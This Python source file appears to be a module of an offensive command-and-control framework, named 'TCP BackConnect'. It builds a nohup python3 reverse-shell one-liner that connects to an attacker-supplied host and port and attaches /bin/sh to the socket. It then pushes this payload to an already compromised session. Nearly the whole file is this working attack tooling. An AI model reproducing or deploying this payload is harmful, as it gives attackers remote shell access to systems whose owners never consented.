#!/usr/bin/env python3
import os,sys
# append base path to sys.path
runpath = os.path.dirname(os.path.realpath(__file__))
approot = os.path.abspath(os.path.join(runpath, os.pardir))
sys.path.append(os.path.join(runpath,'..'))
sys.path.append(approot)
import lib.tcp_server as ts
import lib.shm as shm


module_name ="TCP BackConnect"
module_id = "connect/tcp_backconnect"
module_description="Listening for incoming connections"
module_type = 'module'
variables = {'lhost':'',
             'lport':'',
             'type':'python3',
             'session':'',
             'runhandler':'False',
             'handler':''}

reverse_types = ['python3','python3_tty']

def python3_backconnect():
    try:
        payload = "nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' &"
        sid = variables['session']
        lhost = variables['lhost']
        lport = variables['lport']
        payload = payload.replace('LHOST',lhost).replace('LPORT',lport)
        if sid:
            session = get_session_client(sid)
            if session:
                session.send(payload)
        else:
            print("[!] Session variable is required!")
    except Exception as x:
        print(x)


def get_session_client(clientid):
    try:
        if is_number(clientid):
            cid = int(clientid)
            if len(shm.connected_clients) >= cid:
                session = shm.connected_clients[cid]
            else:
                print(f"[!] {str(cid)} is not a valid session number")
        else:
            for s in shm.connected_clients:
                if s.name == clientid:
                    session = s
        return session
    except Exception as x:
        print(x)
    
def is_number(cmd):
    try:
        num = int(cmd)
        return True
    except:
        return False
    
def run(arguments=''):
    # beta version of backconnect
    if variables['type'] == 'python3':
        python3_backconnect()
